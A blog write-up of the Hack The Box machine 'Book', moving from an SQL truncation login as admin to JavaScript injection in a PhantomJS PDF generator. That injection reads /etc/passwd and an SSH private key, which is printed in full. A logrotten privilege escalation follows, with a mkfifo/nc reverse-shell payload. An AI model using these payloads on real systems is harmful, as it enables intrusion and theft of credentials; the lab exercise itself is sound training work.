from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.176 book.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ nmap -sV -sT -sC -T5 book.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 04:27 EDT Nmap scan report for book.htb (10.10.10.176) Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA) | 256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA) |_ 256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: LIBRARY - Read | Learn | Have Fun Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.53 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe lets see what it has to offer ? http://book.htb/: We don’t have an account but lets sign up for one. Logging in brings us to what seems to be an online book collection. http://book.htb/home.php: There was a page where we could upload our own books but it will be subjected to approval, which I believe is by the admin. http://book.htb/collections.php: We also see found the admin’s email admin@book.htb. http://book.htb/contact.php: It took a while to look for a possible vector into the box but I happened to chance upon something on the login/register page where I saw a certain segment in the javascript code where it does the validation of the user’s input when registering. http://book.htb/: 1 2 3 4 5 6 7 8 9 10 11 12 function validateForm() { var x = document.forms[&quot;myForm&quot;][&quot;name&quot;].value; var y = document.forms[&quot;myForm&quot;][&quot;email&quot;].value; if (x == &quot;&quot;) { alert(&quot;Please fill name field. Should not be more than 10 characters&quot;); return false; } if (y == &quot;&quot;) { alert(&quot;Please fill email field. Should not be more than 20 characters&quot;); return false; } } This validation code is poorly implemented as even though the alerts informs the user of the character limit, it does not enforce it. Lets check if this is enfored on the server side. I decided to register a new account but with an email of length 21, admin@book.htb1234567. After submitting the above request, I tried to logging in but failed due to wrong credentials. Is it possible that my email was truncated? I tried logging in one more time but with one character less, admin@book.htb123456, and was successful! This seems like it is vulnerable to SQL Truncation Attack. If we try registering with the email admin@book.htb%20%20%20%20%20%201 and logging it with it, we login as admin@book.htb! However, not much can be done but perhaps there is an admin page somewhere so lets brute-force some directories with gobuster! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 $ gobuster dir -u http://book.htb/ -w /usr/share/wordlists/dirb/big.txt -t 12 -k -x .php =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://book.htb/ [+] Threads: 12 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php [+] Timeout: 10s =============================================================== 2020/04/09 12:41:45 Starting gobuster =============================================================== /.htaccess (Status: 403) /.htaccess.php (Status: 403) /.htpasswd (Status: 403) /.htpasswd.php (Status: 403) /admin (Status: 301) /books.php (Status: 302) /collections.php (Status: 302) /contact.php (Status: 302) /db.php (Status: 200) /docs (Status: 301) /download.php (Status: 302) /feedback.php (Status: 302) /home.php (Status: 302) /images (Status: 301) /index.php (Status: 200) /logout.php (Status: 302) /profile.php (Status: 302) /search.php (Status: 302) /server-status (Status: 403) /settings.php (Status: 302) =============================================================== 2020/04/09 12:51:57 Finished =============================================================== Seems like /admin is what we are looking for. Fortunately for us, we already have the admin credentials so lets just login with it. However, there was only one page that caught my attention. http://book.htb/admin/collections.php. Clicking on the PDF link beside User will download a .pdf file containing a list of the usernames and emails in a table. Likewise, for the PDF link beside Collections will download a .pdf file containing the list of books on the website. It seems like the .pdf files are generated on the fly but the question is how? I tried inject all sort of values but something stuck out: HTML tags. Apparently, HTML tags are being rendered when generating the pdf files. This is what happens when I change my username to &lt;h1&gt;I am a H1&lt;/h1&gt;: Interesting… Lets see if we can perform SSRF with this: First I start a nc server on port 80 to receive the web request. 1 2 $ nc -lvnp 80 listening on [any] 80 ... I then change my username to &lt;img src =&quot;http://10.10.XX.XX&quot;&gt; and download the .pdf again. Sadly I did not get any request, probably because the name was truncated to probably 10 characters if you remember from registration validation code. Lets try to submit a book and use the PDF link for Collections. This time, I put &lt;img src =&quot;http://10.10.XX.XX&quot;&gt; as the Book Title, uploaded a random file and then download the .pdf file. On my nc, I caught the raw web request: 1 2 3 4 5 6 7 8 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 55942 GET / HTTP/1.1 User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1 Accept: */* Connection: Keep-Alive Accept-Encoding: gzip, deflate Accept-Language: en,* Host: 10.10.XX.XX SSRF was successful but what caught my eye was the PhantomJS in the User-Agent header. 1 2 3 4 5 PhantomJS is a headless web browser scriptable with JavaScript. It runs on Windows, macOS, Linux, and FreeBSD. Using QtWebKit as the back-end, it offers fast and native support for various web standards: DOM handling, CSS selector, JSON, Canvas, and SVG. The following simple script for PhantomJS loads Google homepage, waits a bit, and then captures it to an image. Exploitation (1) From this link, it states that PhantomJS has the function to create PDFs from HTML. Cool! To exploit this, I followed this guide to read the /etc/passwd file. Submitting the following as my Book Title: 1 &lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&lt;/script&gt; Returns this pdf: Hmm…There is the ssh service running on the machine and there is a user called reader with the home directory at /home/reader. Lets see if we can find any private keys in /home/reader/.ssh, which are typically named as id_rsa. 1 &lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(&#39;&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(&#39;&lt;p style=&quot;width:100%; word-wrap: break-word;&quot;&gt;&#39; + this.responseText + &#39;&lt;/p&gt;&#39;)};x.open(&quot;GET&quot;,&quot;file:///home/reader/.ssh/id_rsa&quot;);x.send();&lt;/script&gt; Notice that I had to specify width of 100% and break-word. This is because the key was too long and parts of the key will be missed out if I didn’t. I then used pdftotext to convert the PDF to text: 1 $ pdftotext 19868.pdf Because of the break-word, you will need to manually remove the newlines to fix the private key. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ cat 19868.txt -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0 WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0 ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s 7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK 75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7 3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+ McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz 7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6 GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/ ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+ SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi 5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4= -----END RSA PRIVATE KEY----- user.txt Using the private key, we can ssh into the box. 1 2 3 4 $ chmod 700 19868.txt $ ssh -i 19868.txt reader@book.htb reader@book:~$ cat user.txt 51c1XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) In the home directory was I first uploaded pspy to /tmp so that I could monitor for processes. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 reader@book:/tmp$ wget http://10.10.XX.XX/pspy --2020-07-11 11:40:51-- http://10.10.XX.XX/pspy Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1090528 (1.0M) [application/octet-stream] Saving to: ‘pspy’ pspy 100%[===============================================================================================================================&gt;] 1.04M 584KB/s in 1.8s 2020-07-11 11:40:54 (584 KB/s) - ‘pspy’ saved [1090528/1090528] reader@book:/tmp$ chmod +x pspy &amp;&amp; ./pspy ... 2020/07/11 11:50:22 CMD: UID=0 PID=48727 | /usr/sbin/logrotate -f /root/log.cfg logrotate was being ran from time to time as root and its version was outdated! 1 2 reader@book:/tmp$ logrotate --version logrotate 3.11.0 Exploitation (2) According to this link, logrotate version 3.15.1 and below are vulnerable to an exploit called logrotten. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 reader@book:/tmp$ wget http://10.10.XX.XX/logrotten.c --2020-07-11 12:43:27-- http://10.10.14.7/logrotten.c Connecting to 10.10.14.7:80... connected. HTTP request sent, awaiting response... 200 OK Length: 5796 (5.7K) [text/plain] Saving to: ‘logrotten.c’ logrotten.c 100%[===============================================================================================================================&gt;] 5.66K --.-KB/s in 0.006s 2020-07-11 12:43:27 (975 KB/s) - ‘logrotten.c’ saved [5796/5796] reader@book:/tmp$ gcc logrotten.c reader@book:/tmp$ gcc logrotten.c -o logrotten reader@book:/tmp$ ./logrotten usage: logrotten [OPTION...] &lt;logfile&gt; -h --help Print this help -t --targetdir &lt;dir&gt; Abosulte path to the target directory -p --payloadfile &lt;file&gt; File that contains the payload -s --sleep &lt;sec&gt; Wait before writing the payload -d --debug Print verbose debug messages -c --compress Hijack compressed files instead of created logfiles -o --open Use IN_OPEN instead of IN_MOVED_FROM To use logrotten, we need to prepare a script that will act as our payload. 1 2 cat payloadfile rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XX.XX 1337 &gt;/tmp/f The above script creates a reverse shell connection back to us, so need to prepare a listener as well using nc. 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... Lastly, we will need to target a suitable log file that is configured to create a new copy of itself when rotated. Coincidentially, there was a access.log in /home/reader/backups/. Echoing a line into it causes it to rotate immediately! 1 2 3 4 5 6 7 8 9 10 11 12 reader@book:~/backups$ ls -al total 8 drwxr-xr-x 2 reader reader 4096 Jul 11 13:58 . drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 .. -rw-r--r-- 1 reader reader 0 Jul 11 13:42 access.log reader@book:~/backups$ echo something &gt;&gt; access.log reader@book:~/backups$ ls -al total 12 drwxr-xr-x 2 reader reader 4096 Jul 11 13:59 . drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 .. -rw-r--r-- 1 reader reader 0 Jul 11 13:59 access.log -rw-r--r-- 1 reader reader 10 Jul 11 13:59 access.log.1 To execute logrotten successfully, I will need to start another ssh session that will echo the line into access.log while my current ssh session will execute logrotten. On current ssh session: 1 2 reader@book:/tmp$ ./logrotten -p payloadfile /home/reader/backups/access.log Waiting for rotating /home/reader/backups/access.log... On another ssh session: 1 reader@book:~/backups$ echo something &gt;&gt; access.log On current ssh session again: 1 2 3 Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d Waiting 1 seconds before writing payload... Done! root.txt logrotten has successfully created a symbolic link of our payload to /etc/bash_completion.d, so now we just need to run /bin/bash to force the execution of our payload and voila, we caught the shell as root! 1 2 3 4 5 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 49512 # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt 84daXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/book-htb/","@type":"BlogPosting","headline":"Hack The Box - Book","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-07-12T10:31:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Book | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Book</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Book</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Jul 12, 2020, 10:31 AM +0800" > Jul 12, 2020 <i class="unloaded">2020-07-12T10:31:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1939 words">10 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating systems that I will be using to tackle this machine is a Kali Linux VM and a Windows Commando VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.176 book.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> <span class="nt">-T5</span> book.htb
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-03-14 04:27 EDT
Nmap scan report <span class="k">for </span>book.htb <span class="o">(</span>10.10.10.176<span class="o">)</span>
Host is up <span class="o">(</span>0.24s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 <span class="o">(</span>RSA<span class="o">)</span>
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not <span class="nb">set</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>24.53 seconds

</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><p>Not much can be done with the <code class="language-plaintext highlighter-rouge">ssh</code> service as we do not have any credentials on hand so lets come back to it later. As for the <code class="language-plaintext highlighter-rouge">http</code> service, maybe lets see what it has to offer ?</p><p><code class="language-plaintext highlighter-rouge">http://book.htb/</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book1.png" alt="" /></p><p>We don’t have an account but lets sign up for one.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book2.png" alt="" /></p><p>Logging in brings us to what seems to be an online book collection.</p><p><code class="language-plaintext highlighter-rouge">http://book.htb/home.php</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book3.png" alt="" /></p><p>There was a page where we could upload our own books but it will be subjected to approval, which I believe is by the admin.</p><p><code class="language-plaintext highlighter-rouge">http://book.htb/collections.php</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book4.png" alt="" /></p><p>We also see found the admin’s email <code class="language-plaintext highlighter-rouge">admin@book.htb</code>.</p><p><code class="language-plaintext highlighter-rouge">http://book.htb/contact.php</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/book5.png" alt="" /></p><p>It took a while to look for a possible vector into the box but I happened to chance upon something on the login/register page where I saw a certain segment in the <code class="language-plaintext highlighter-rouge">javascript</code> code where it does the validation of the user’s input when registering.</p><p><code class="language-plaintext highlighter-rouge">http://book.htb/</code>:</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">validateForm</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="dl">"</span><span class="s2">myForm</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="dl">"</span><span class="s2">myForm</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">email</span><span class="dl">"</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
